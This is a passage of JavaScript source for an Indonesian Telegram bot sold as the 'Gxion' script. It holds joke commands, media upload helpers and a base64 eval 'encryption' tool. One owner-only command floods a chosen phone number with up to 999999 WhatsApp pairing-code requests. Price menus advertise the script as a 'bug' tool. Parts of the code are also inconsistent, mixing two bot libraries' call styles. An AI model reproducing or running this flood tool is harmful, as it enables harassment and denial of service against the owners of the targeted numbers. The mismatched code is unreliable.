  ctx.reply(`🔮 *Ramalan untuk ${nama}:*\n\n✨ ${random}\n\n🔮 *Ketik /ramal [nama] lagi!*`, { parse_mode: "HTML" });
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
// ========== CEK CUACA (HIBURAN) ==========
bot.command("cuaca", async (ctx) => {
  const kondisi = [
    "Cerah ☀️", "Berawan 🌥️", "Hujan Ringan 🌦️", "Hujan Lebat 🌧️",
    "Badai ⛈️", "Mendung 🌫️", "Panas Terik 🔥", "Dingin 🥶"
  ];
  
  const suhu = Math.floor(Math.random() * 20) + 20; // 20-40°C
  const kelembaban = Math.floor(Math.random() * 50) + 40; // 40-90%
  const randomKondisi = kondisi[Math.floor(Math.random() * kondisi.length)];
  
  ctx.reply(
`
<blockquote>
🌤️ PRAKIRAAN CUACA*l 🌤️

📌 Kondisi: ${randomKondisi}
🌡️ Suhu: ${suhu}°C
💧 Kelembaban: ${kelembaban}%
💨 Angin: ${Math.floor(Math.random() * 20) + 5} km/jam

✨ Perkiraan ini hanya hiburan ya!
🔮 Cuaca sebenarnya bisa berbeda</blockquote>`,
    { parse_mode: "HTML" }
  );
});
// ========== UPLOAD KE TELEGRAPH (GAMPANG & PASTI JALAN) ==========
bot.command("catboxurl", async (ctx) => {
  // Cek reply foto
  if (!ctx.message.reply_to_message) {
    return ctx.reply(
`📸 UPLOAD GAMBAR 📸

Cara pakai:
1. Kirim foto
2. Reply foto itu
3. Ketik /catboxurl

✅ Gratis, cepat, permanen!`,
      { parse_mode: "Markdown" }
    );
  }
  
  let fileId = null;
  let replied = ctx.message.reply_to_message;
  
  if (replied.photo) {
    fileId = replied.photo[replied.photo.length - 1].file_id;
  } else if (replied.document && replied.document.mime_type?.startsWith('image/')) {
    fileId = replied.document.file_id;
  } else {
    return ctx.reply("❌ Harus berupa foto!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengupload...*", { parse_mode: "Markdown" });
  
  try {
    // Dapatkan file dari Telegram
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    
    // Upload ke Telegraph
    const postData = JSON.stringify([{ url: fileUrl }]);
    
    const options = {
      hostname: 'telegra.ph',
      path: '/upload',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const request = https.request(options, (response) => {
      let data = '';
      response.on('data', (chunk) => { data += chunk; });
      response.on('end', () => {
        try {
          const result = JSON.parse(data);
          if (result[0] && result[0].src) {
            ctx.reply(
`✅ Upload Berhasil! ✅

🔗 Link: https://telegra.ph${result[0].src}

📌 Klik link untuk lihat gambar
💾 Link permanent!`,
              { parse_mode: "Markdown" }
            );
          } else {
            ctx.reply("❌ Gagal upload! Coba lagi.", { parse_mode: "Markdown" });
          }
        } catch (err) {
          ctx.reply("❌ Error parsing response!", { parse_mode: "Markdown" });
        }
      });
    });
    
    request.write(postData);
    request.end();
    
  } catch (err) {
    ctx.reply("❌ Terjadi kesalahan!", { parse_mode: "Markdown" });
  }
});
// ========== ENKRIPSI KODE JS (NO ERROR - FIX) ==========

function simpleEncode(code) {
  let encoded = Buffer.from(code).toString('base64');
  return `eval(Buffer.from('${encoded}', 'base64').toString())`;
}

function simpleDecode(encrypted) {
  try {
    let match = encrypted.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
    if (match) {
      return Buffer.from(match[1], 'base64').toString();
    }
    return null;
  } catch(e) {
    return null;
  }
}

// COMMAND ENKRIPSI (FIX REPLY)
bot.command("encjs", (ctx) => {
  let code = "";
  
  // PRIORITAS: Ambil dari reply
  if (ctx.message.reply_to_message) {
    let replied = ctx.message.reply_to_message;
    if (replied.text) {
      code = replied.text;
    } else if (replied.caption) {
      code = replied.caption;
    }
  }
  
  // Jika tidak ada reply, ambil dari argumen
  if (!code) {
    let args = ctx.message.text.split(" ");
    args.shift();
    code = args.join(" ");
  }
  
  // Jika masih kosong, tampilkan bantuan
  if (!code.trim()) {
    return ctx.reply(
`🔒 *ENKRIPSI KODE JS* 🔒

📌 *Cara pakai:*
• /encjs console.log("Halo")
• Atau *reply* pesan yang berisi kode, lalu ketik /encjs

✅ *Contoh:*
[Kamu kirim pesan: console.log("test")]
[Lalu reply pesan itu dengan /encjs]`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleEncode(code);
  
  ctx.reply(
`🔐 *KODE TERPROTEKSI* 🔐

\`\`\`javascript
${hasil}
\`\`\`

📌 *Simpan kode asli!*`,
    { parse_mode: "Markdown" }
  );
});

// COMMAND DEKRIPSI
bot.command("decjs", (ctx) => {
  let encrypted = "";
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
    encrypted = ctx.message.reply_to_message.text;
  } else {
    let args = ctx.message.text.split(" ");
    args.shift();
    encrypted = args.join(" ");
  }
  
  if (!encrypted.trim()) {
    return ctx.reply(
`🔓 *DEKRIPSI KODE JS* 🔓

📌 *Cara pakai:*
Reply pesan yang berisi kode terenkripsi, lalu ketik /decjs`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleDecode(encrypted);
  
  if (hasil) {
    ctx.reply(
`🔓 *KODE ASLI* 🔓

\`\`\`javascript
${hasil}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", { parse_mode: "Markdown" });
  }
});
/// ========== TOOLS SPAM PAIRING =======\\\
bot.command(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

/// PRICE SCRIPT KECE \\\
bot.command("pricescript", async (ctx) => {
  await ctx.reply(`
<blockquote>
┏━━〔 📜 KEUNGGULAN SCRIPT GXION 〕━━⬣
┣ ⿻ Selalu Update Ke Versi Yang Stabil ✅
┣ ⿻ Cocok Untuk Murbug X Pribadi ✅
┣ ⿻ Menggunakan Fitur Auto-Update ✅
┣ ⿻ Cocok untuk Push Channel Anda ✅
┣ ⿻ High Quality Script ✅
┗━━━━━━━━━━━━━━━━⬣
</blockquote>

<b>「 LIST PRICE SCRIPT GXION 」</b>
<blockquote>
⿻ FULL UPDATE SCRIPT ACCESS
┗ Rp 20.000 / 20K

⿻ RESELLER SCRIPT ACCESS
┗ Rp 30.000 / 30k

⿻ PARTNER SCRIPT ACCESS 
┗ Rp 55.000 / 55K

⿻ MODERATOR SCRIPT ACCESS
┗ Rp 70.000 / 70K

⿻ CEO SCRIPT ACCESS
┗ Rp 90.000 / 90K

⿻ OWNER SCRIPT ACCESS
┗ Rp 110.000 / 110K
</blockquote>

<b>「 BENEFIT SETIAP ROLES / ACCESS 」</b> 
<blockquote>
<b>⿻ BENEFIT ACCESS FULL UPDATE :</b>
┣ Masuk Group Utama Gxion
┗ Mendapatkan Script Gxion Auto - Update

<b>⿻ BENEFIT ACCESS RESELLER :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┗ Bisa Add Token Sendiri 

<b>⿻ BENEFIT ACCESS PARTNER :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┣ Bisa Menjual Access Reseller
┗ Bisa Add Token Sendiri 

<b>⿻ BENEFIT ACCESS MODERATOR :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┣ Bisa Menjual Access Reseller
┣ Bisa Menjual Access Partner
┗ Bisa Add Token Sendiri 

<b>⿻ BENEFIT ACCESS CEO  :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┣ Bisa Menjual Access Reseller
┣ Bisa Menjual Access Partner
┣ Bisa Menjual Access Moderator
┗ Bisa Add Token Sendiri 

<b>⿻ BENEFIT ACCESS OWNER  :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┣ Bisa Menjual Access Reseller
┣ Bisa Menjual Access Partner
┣ Bisa Menjual Access Moderator
┣ Bisa Menjual Access Ceo
┗ Bisa Add Token Sendiri 
</blockquote>
<blockquote>
<i>Berminat untuk membeli sebuah script Gxion ini Silahkan anda bisa menghubungi Admin terdekat yang menjualnya atau Hubungi Developer script secara langsung Yang ber Username [ @Bawzhhh ]</i>
</blockquote>
`, {
    parse_mode: "HTML"
  });
});
// ========== MENU HARGA SCRIPT ==========
// ✨ Ganti isi array berikut sesuai produk & harga kamu ✨
bot.command('harga', async (ctx) => {
    try {
        const teks = `
\`\`\`js
╔══════════════════════════╗
║      🪧 HARGA GXION SCRIPT   ║
╠══════════════════════════╣
║  ⛧ Full Up     : 20K     ║
║  ⛧ Reseller    : 30K     ║
║  ⛧ Partner     : 55K     ║
║  ⛧ Moderator   : 70K     ║
║  ⛧ CEO         : 90K     ║
║  ⛧ Owner       : 110K    ║
╠══════════════════════════╣
║   ⚡ SCRIPT BUG VIA TELEGRAM  ║
╚══════════════════════════╝
        \`\`\`
        `;

        await ctx.reply(teks, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "👑 Contact Owner", url: "https://t.me/Bawzhhh", style: "danger" }
                    ]
                ]
            }
        });

    } catch (err) {
        console.log(err);
        ctx.reply('Gagal menampilkan Bagian daftar /harga Di Karenakan Masalah Tertentu.');
    }
});
/// COMMAND CEK FUNCTION \\\
bot.command("cekfunction", async (ctx) => {
  try {

    if (!ctx.message.reply_to_message)
      return ctx.reply("Reply function JavaScript yang ingin dicek.");

    const text =
      ctx.message.reply_to_message.text ||
      ctx.message.reply_to_message.caption;

    if (!text)
      return ctx.reply("Pesan yang direply tidak berisi kode.");

    let acorn;
    try {
      acorn = require("acorn");
    } catch {
      return ctx.reply("Module acorn belum terinstall.\nInstall: npm install acorn");
    }

    try {

      acorn.parse(text, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true
      });

      return ctx.reply(
`🔎 Mengecek syntax function...

✅ SYNTAX VALID
Tidak ditemukan error.

© Gxion`
      );

    } catch (err) {

      const lines = text.split("\n");
      const line = err.loc?.line || 0;
      const column = err.loc?.column || 0;

      const start = Math.max(0, line - 3);
      const end = Math.min(lines.length, line + 2);

      const snippet = lines
        .slice(start, end)
        .map((l, i) => {
          const num = start + i + 1;

          return num === line
            ? `👉 ${num} | ${l}`
            : `   ${num} | ${l}`;
        })
        .join("\n");

      return ctx.reply(
`❌ ERROR TERDETEKSI

${err.message}
Line ${line}:${column}

📌 CUPlikan:
\`\`\`javascript
${snippet}
\`\`\`

© Gxion`
      );

    }

  } catch (e) {
    console.error(e);
    ctx.reply("Terjadi error saat mengecek function.");
  }
});
// ========== DISABLE / ENABLE COMMAND (NO OWNER ID, NO FS) ==========
let disabled = [];

// ================= OFF CMD =================
global.disabled = global.disabled || [];

bot.command("offcmd", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.trim().split(/\s+/);

    if (!args[1]) {
      return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ OFFCMD SYSTEM 〕━━━⬣
┣ ⿻ Example Command :
┣ ⿻ /offcmd menu
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    const cmd = args[1].toLowerCase().replace("/", "");

    if (global.disabled.includes(cmd)) {
      return ctx.reply(
`<blockquote>
┏━━━〔 ❌ COMMAND ERROR 〕━━━⬣
┣ ⿻ Command : /${cmd}
┣ ⿻ Status  : Sudah NONAKTIF
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    global.disabled.push(cmd);

    return ctx.reply(
`<blockquote>
┏━━━〔 🚫 COMMAND DISABLED 〕━━━⬣
┣ ⿻ Command : /${cmd}
┣ ⿻ Status  : Successfully Disabled
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error(err);

    return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ SYSTEM ERROR 〕━━━⬣
┣ ⿻ Gagal menonaktifkan command
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

// ================= ON CMD =================
bot.command("oncmd", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.trim().split(/\s+/);

    if (!args[1]) {
      return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ ONCMD SYSTEM 〕━━━⬣
┣ ⿻ Example Command :
┣ ⿻ /oncmd menu
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        {
          parse_mode: "HTML"
        }
      );
    }

    const cmd = args[1].toLowerCase().replace("/", "");

    if (!disabled.includes(cmd)) {
      return ctx.reply(
`<blockquote>
┏━━━〔 ❌ COMMAND ERROR 〕━━━⬣
┣ ⿻ Command : /${cmd}
┣ ⿻ Status  : Sudah dalam mode <b>ACTIVED</b>
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        {
          parse_mode: "HTML"
        }
      );
    }

    disabled = disabled.filter(c => c !== cmd);

    return ctx.reply(
`<blockquote>
┏━━━〔 ✅ COMMAND ENABLED 〕━━━⬣
┣ ⿻ Command : /${cmd}
┣ ⿻ Status  : Successfully Activated
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error(err);

    return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ SYSTEM ERROR 〕━━━⬣
┣ ⿻ Gagal mengaktifkan command
┣ ⿻ Kesalahan Internal Server
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );
  }
});

// ================= DISABLE LIST =================
bot.command("offcmdlist", checkOwner, async (ctx) => {
  try {

    if (disabled.length === 0) {
      return ctx.reply(
`<blockquote>
┏━━━〔 📋 OFFCMD LIST 〕━━━⬣
┣ ⿻ Tidak ada command nonaktif
┣ ⿻ Semua command sedang dalam mode <b>ACTIVED</b>
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        {
          parse_mode: "HTML"
        }
      );
    }

    const list = disabled
      .map((c, i) => `┣ ⿻ ${i + 1}. /${c}`)
      .join("\n");

    return ctx.reply(
`<blockquote>
┏━━━〔 📋 OFFCMD LIST 〕━━━⬣
${list}
┣━━━━━━━━━━━━━━━━⬣
┣ ⿻ Total Nonaktif : ${disabled.length}
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error(err);

    return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ SYSTEM ERROR 〕━━━⬣
┣ ⿻ Gagal mengambil daftar command
┣ ⿻ Terjadi kesalahan pada sistem
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );
  }
});
///==== LOCK AND UNLOCK ALL CMD====\\\
let lockAllCmd = false;

// LOCK
bot.command("lockallcmd", checkOwner, async (ctx) => {
  try {

    if (lockAllCmd) {
      return ctx.reply(
`<blockquote>
┏━━━〔 🔒 LOCK ALL CMD 〕━━━⬣
┣ ⿻ Status : Sudah aktif
┣ ⿻ Semua command telah diblokir
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        {
          parse_mode: "HTML"
        }
      );
    }

    lockAllCmd = true;

    return ctx.reply(
`<blockquote>
┏━━━〔 🔒 LOCK ALL CMD 〕━━━⬣
┣ ⿻ Status : Berhasil diaktifkan
┣ ⿻ Semua command berhasil diblokir
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error(err);

    return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ SYSTEM ERROR 〕━━━⬣
┣ ⿻ Gagal memblokir command
┣ ⿻ Terjadi kesalahan pada sistem
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );
  }
});

// UNLOCK
bot.command("unlockallcmd", checkOwner, async (ctx) => {
  try {

    if (!lockAllCmd) {
      return ctx.reply(
`<blockquote>
┏━━━〔 🔓 UNLOCK ALL CMD 〕━━━⬣
┣ ⿻ Status : Sudah nonaktif
┣ ⿻ Semua command sudah terbuka
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        {
          parse_mode: "HTML"
        }
      );
    }

    lockAllCmd = false;

    return ctx.reply(
`<blockquote>
┏━━━〔 🔓 UNLOCK ALL CMD 〕━━━⬣
┣ ⿻ Status : Berhasil dibuka
┣ ⿻ Semua command telah diaktifkan
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error(err);

    return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ SYSTEM ERROR 〕━━━⬣
┣ ⿻ Gagal membuka blokir command
┣ ⿻ Terjadi kesalahan pada sistem
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );
  }
});

// MIDDLEWARE
bot.use(async (ctx, next) => {
  try {
    const text = ctx.message?.text || "";

    if (
      text.startsWith("/lockallcmd") ||
      text.startsWith("/unlockallcmd")
    ) {
      return next();
    }

    if (lockAllCmd) {
      return ctx.reply(
`<blockquote>
┏━━━〔 🔒 LOCK ALL CMD 〕━━━⬣
┣ ⿻ Status : Command dikunci
┣ ⿻ Semua akses command dibatasi
┣ ⿻ Silahkan hubungi owner bot
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        {
          parse_mode: "HTML"
        }
      );
    }

    return next();

  } catch (err) {
    console.error(err);

    return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ SYSTEM ERROR 〕━━━⬣
┣ ⿻ Gagal memproses command
┣ ⿻ Terjadi kesalahan pada sistem
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );
  }
});
// ================= MIDDLEWARE BLOKIR =================
bot.use(async (ctx, next) => {
  try {
    if (!ctx.message?.text) return next();

    const cmd = ctx.message.text
      .split(" ")[0]
      .replace("/", "")
      .toLowerCase();

    if (disabled.includes(cmd)) {
      return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ COMMAND DISABLED 〕━━━⬣
┣ ⿻ Command : /${cmd}
┣ ⿻ Status  : Sedang dinonaktifkan
┣ ⿻ Silahkan hubungi owner bot
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
        {
          parse_mode: "HTML"
        }
      );
    }

    return next();

  } catch (err) {
    console.error(err);

    return ctx.reply(
`<blockquote>
┏━━━〔 ⚠️ SYSTEM ERROR 〕━━━⬣
┣ ⿻ Gagal memeriksa command
┣ ⿻ Terjadi kesalahan pada sistem
┗━━━━━━━━━━━━━━━━⬣
</blockquote>`,
      {
        parse_mode: "HTML"
      }
    );
  }
});
// ========== REMOVE BACKGROUND ========== 
bot.command("removebg", async (ctx) => {
  const chatId = ctx.chat.id;

 
  if (
    !ctx.message.reply_to_message ||
    !ctx.message.reply_to_message.photo
  ) {
    return ctx.reply(
      "📸 *Silakan reply foto yang ingin dihapus background-nya.*",
      {
        parse_mode: "Markdown"
      }
    );
  }

  try {
    await ctx.reply("⏳ Sedang menghapus background...");

   
    const photo =
      ctx.message.reply_to_message.photo[
        ctx.message.reply_to_message.photo.length - 1
      ];

  
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

   
    const imageResponse = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

  
    const formData = new FormData();
    formData.append("size", "auto");
    formData.append(
      "image_file",
      Buffer.from(imageResponse.data),
      "image.jpg"
    );

  
    const response = await axios.post(
      "https://api.remove.bg/v1.0/removebg",
      formData,
      {
        headers: {
          ...formData.getHeaders(),
          "X-Api-Key": REMOVE_BG_KEY
        },
        responseType: "arraybuffer"
      }
    );

   
    const filePath = `./removebg_${chatId}.png`;
    fs.writeFileSync(filePath, response.data);

   
    await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption: "☘️ Background berhasil dihapus!"
      }
    );

  
    fs.unlinkSync(filePath);

  } catch (error) {
    console.error(
      "REMOVEBG ERROR:",
      error.response?.data?.toString() || error.message
    );

    return ctx.reply(
      `❌ Gagal remove background:\n${
        error.response?.data?.toString() || error.message
      }`
    );
  }
});
// ========== 10 TOOLS SERU-SERUAN ==========

// 1. Cek Jodoh (random)
bot.command("jodoh", (ctx) => {
  const persen = Math.floor(Math.random() * 100) + 1;
  const status = persen > 70 ? "Cocok banget! 💖" : (persen > 40 ? "Bisa jadi 😊" : "Kurang cocok 😅");
  ctx.reply(`💘 *Cek Jodoh*\nKecocokan: ${persen}%\nStatus: ${status}`, { parse_mode: "Markdown" });
});

// 2. Ramalan Shio (random)
bot.command("shio", (ctx) => {
  const ramalan = ["Hoki besar 🍀", "Lumayan beruntung ✨", "Biasa aja 😶", "Kurang bagus 😕", "Sial dikit 🤣"];
  const random = ramalan[Math.floor(Math.random() * ramalan.length)];
  ctx.reply(`🐉 *Ramalan Shio hari ini:* ${random}`, { parse_mode: "Markdown" });
});

// 3. Tebak Angka (game)
let tebakAngka = {};
bot.command("tebak", (ctx) => {
  const userId = ctx.from.id;
  if (!tebakAngka[userId]) {
    tebakAngka[userId] = Math.floor(Math.random() * 10) + 1;
    return ctx.reply("🎲 *Tebak Angka (1-10)*\nKetik /tebak [angka]\nContoh: /tebak 5", { parse_mode: "Markdown" });
  }
  const args = ctx.message.text.split(" ");
  const tebakan = parseInt(args[1]);
  if (isNaN(tebakan)) return ctx.reply("Masukkan angka 1-10!");
  if (tebakan === tebakAngka[userId]) {
    ctx.reply("🎉 *Benar!* Selamat! 🎉\nKetik /tebak lagi untuk main baru.");
    delete tebakAngka[userId];
  } else {
    ctx.reply(`❌ Salah! Angka rahasianya bukan ${tebakan}. Coba lagi.`);
  }
});

// 4. Kata Motivasi random
bot.command("motivasi", (ctx) => {
  const quotes = [
    "✨ Jangan menyerah, hari ini berat besok mungkin indah.",
    "💪 Sukses dimulai dari keberanian untuk memulai.",
    "🌟 Percaya sama diri sendiri, itu kunci utama.",
    "🌱 Proses tidak akan mengkhianati hasil.",
    "🚀 Bermimpilah tinggi, lalu kejar!"
  ];
  const random = quotes[Math.floor(Math.random() * quotes.length)];
  ctx.reply(`💡 *Motivasi:* ${random}`, { parse_mode: "Markdown" });
});

// 5. Batu-gunting-kertas (suit)
bot.command("suit", (ctx) => {
  const pilihan = ["batu", "gunting", "kertas"];
  const user = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!user || !pilihan.includes(user)) return ctx.reply("Pilih: /suit batu | gunting | kertas");
  const botChoice = pilihan[Math.floor(Math.random() * 3)];
  let hasil = "";
  if (user === botChoice) hasil = "Seri 🤝";
  else if (
    (user === "batu" && botChoice === "gunting") ||
    (user === "gunting" && botChoice === "kertas") ||
    (user === "kertas" && botChoice === "batu")
  ) hasil = "Kamu menang! 🎉";
  else hasil = "Bot menang! 😭";
  ctx.reply(`✊ Kamu: ${user}\n🤖 Bot: ${botChoice}\n${hasil}`);
});

// 6. Cek kepribadian dari nama (random)
bot.command("kepribadian", (ctx) => {
  const sifat = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💖", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"];
  const random = sifat[Math.floor(Math.random() * sifat.length)];
  ctx.reply(`🧠 *Kepribadianmu:* ${random}`, { parse_mode: "Markdown" });
});

// 7. Ramalan karir random
bot.command("karir", (ctx) => {
  const karir = ["Programmer 💻", "Pengusaha 🏢", "Dokter 🩺", "Guru 📚", "Artis 🎬", "Atlet ⚽"];
  const random = karir[Math.floor(Math.random() * karir.length)];
  ctx.reply(`💼 *Karir masa depanmu:* ${random}`, { parse_mode: "Markdown" });
});

// 8. Cek level ganteng/cantik (random)
bot.command("level", (ctx) => {
  const level = Math.floor(Math.random() * 100) + 1;
  let status = level > 80 ? "Level Dewa/ Dewi 😎" : (level > 50 ? "Cukup menawan 😊" : "Biasa saja 🤭");
  ctx.reply(`📊 *Level ketampanan/kecantikan:* ${level}%\n${status}`, { parse_mode: "Markdown" });
});

// 9. Tebak hari lahir (seru-seruan)
bot.command("harilahir", (ctx) => {
  const hari = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"];
  const random = hari[Math.floor(Math.random() * hari.length)];
  ctx.reply(`🎂 *Hari lahir versi random:* Kamu lahir hari ${random}. (Hanya hiburan)`, { parse_mode: "Markdown" });
});

// 10. Game lempar koin
bot.command("koin", (ctx) => {
  const hasil = Math.random() < 0.5 ? "Kepala 🪙" : "Ekor 💰";
  ctx.reply(`🪙 *Hasil lempar koin:* ${hasil}`, { parse_mode: "Markdown" });
});
// ========== PENCARIAN LAGU (DEEZER) ==========
// Command: /lagu [judul lagu]

bot.command("lagu", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("🎵 Cara pakai: /lagu [judul lagu]\nContoh: /lagu blur song 2", { parse_mode: "Markdown" });
  }

  const status = await ctx.reply(`🔍 *Mencari: ${query}`, { parse_mode: "Markdown" });

  try {
    const res = await fetch(`https://api.deezer.com/search?q=${encodeURIComponent(query)}&limit=1`);
    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `❌ Lagu "${query}" tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const track = data.data[0];
    const judul = track.title;
    const artis = track.artist.name;
    const preview = track.preview;
    const cover = track.album.cover_medium;
    const link = track.link;

    // Hapus pesan "mencari"
    await ctx.telegram.deleteMessage(ctx.chat.id, status.message_id).catch(() => {});

    // Kirim cover + info
    if (cover) {
      await ctx.replyWithPhoto(cover, {
        caption: `🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`,
        parse_mode: "Markdown"
      });
    } else {
      await ctx.reply(`🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`, { parse_mode: "Markdown" });
    }

    // Kirim audio preview jika ada
    if (preview && preview !== "null") {
      await ctx.replyWithAudio(preview, {
        title: judul,
        performer: artis,
        caption: "🎧 *Preview 30 detik*"
      });
    } else {
      await ctx.reply("⚠️ *Preview audio tidak tersedia untuk lagu ini.*", { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, "❌ Terjadi kesalahan. Coba lagi nanti.", { parse_mode: "Markdown" }).catch(() => {
      ctx.reply("❌ Terjadi kesalahan. Coba lagi nanti.");
    });
  }
});
// ========== FOTO JADI HD (UPSCALE) ==========
// Gunakan API PicWish (gratis, tanpa API key)

bot.command("hd", async (ctx) => {
  // Cek apakah user reply ke sebuah foto
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply(
`📸 CARA PAKAI:\n1. Kirim foto ke bot\n2. Reply foto tersebut\n3. Ketik /hd\n\n✨ *Hasil: Foto akan di-upgrade ke resolusi lebih tinggi & lebih tajam!`
    );
  }

  const statusMsg = await ctx.reply("⏳ *Memproses foto...* (bisa makan waktu 10-20 detik mohon bersabar...)");

  try {
    // Ambil file ID foto dengan resolusi tertinggi
    const photo = ctx.message.reply_to_message.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

